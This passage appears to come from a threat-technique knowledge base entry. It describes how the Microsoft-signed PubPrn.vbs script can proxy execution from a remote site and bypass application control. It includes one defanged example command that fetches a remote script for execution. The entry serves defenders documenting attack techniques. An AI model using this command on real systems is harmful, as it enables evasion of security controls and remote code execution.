This behavior may bypass signature validation restrictions and application control solutions that do not account for use of these scripts.\n\n<code>PubPrn.vbs</code> is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script is signed by Microsoft and can be used to proxy execution from a remote site.(Citation: Enigma0x3 PubPrn Bypass) An example command is <code>cscript C[:]\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png</code>.",
